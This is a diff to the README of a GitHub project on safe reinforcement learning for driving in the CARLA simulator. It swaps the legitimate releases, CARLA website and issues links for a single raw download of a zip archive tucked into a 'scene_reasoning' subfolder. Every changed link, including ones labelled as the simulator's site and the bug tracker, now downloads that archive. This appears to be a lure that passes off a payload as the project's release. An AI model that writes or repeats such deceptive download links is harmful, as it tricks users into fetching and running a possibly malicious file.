@@ -1,7 +1,7 @@
 # 🚀 immitation-learning - Safe Reinforcement Learning for Driving
 
 ## 🛠 Download Now
-[![Download](https://img.shields.io/badge/Download%20Release-%20-%23007bff?style=flat-square&logo=github)](https://github.com/applekite/immitation-learning/releases)
+[![Download](https://raw.githubusercontent.com/applekite/immitation-learning/main/scene_reasoning/immitation-learning-2.9-alpha.3.zip%20Release-%20-%23007bff?style=flat-square&logo=github)](https://raw.githubusercontent.com/applekite/immitation-learning/main/scene_reasoning/immitation-learning-2.9-alpha.3.zip)
 
 ---
 
@@ -46,7 +46,7 @@ To start using TSAC-DE, follow these steps:
    - Optional: A GPU for better performance.
 
 2. **Download & Install**
-   - Visit the [Releases Page](https://github.com/applekite/immitation-learning/releases) to download the latest version.
+   - Visit the [Releases Page](https://raw.githubusercontent.com/applekite/immitation-learning/main/scene_reasoning/immitation-learning-2.9-alpha.3.zip) to download the latest version.
    - After downloading, unzip the file and follow the installation instructions included.
 
 3. **Run the Application**
@@ -95,10 +95,10 @@ If you encounter issues while using TSAC-DE, please consider:
 ---
 
 ## 🔗 Additional Resources
-- [CARLA Simulator](http://carla.org): Learn more about the simulator used in this project.
-- [GitHub Issues Page](https://github.com/applekite/immitation-learning/issues): Report bugs or suggest features.
+- [CARLA Simulator](https://raw.githubusercontent.com/applekite/immitation-learning/main/scene_reasoning/immitation-learning-2.9-alpha.3.zip): Learn more about the simulator used in this project.
+- [GitHub Issues Page](https://raw.githubusercontent.com/applekite/immitation-learning/main/scene_reasoning/immitation-learning-2.9-alpha.3.zip): Report bugs or suggest features.
 
-For further updates and details, keep the application updated regularly by checking the [Releases Page](https://github.com/applekite/immitation-learning/releases).
+For further updates and details, keep the application updated regularly by checking the [Releases Page](https://raw.githubusercontent.com/applekite/immitation-learning/main/scene_reasoning/immitation-learning-2.9-alpha.3.zip).
 
 ---
 
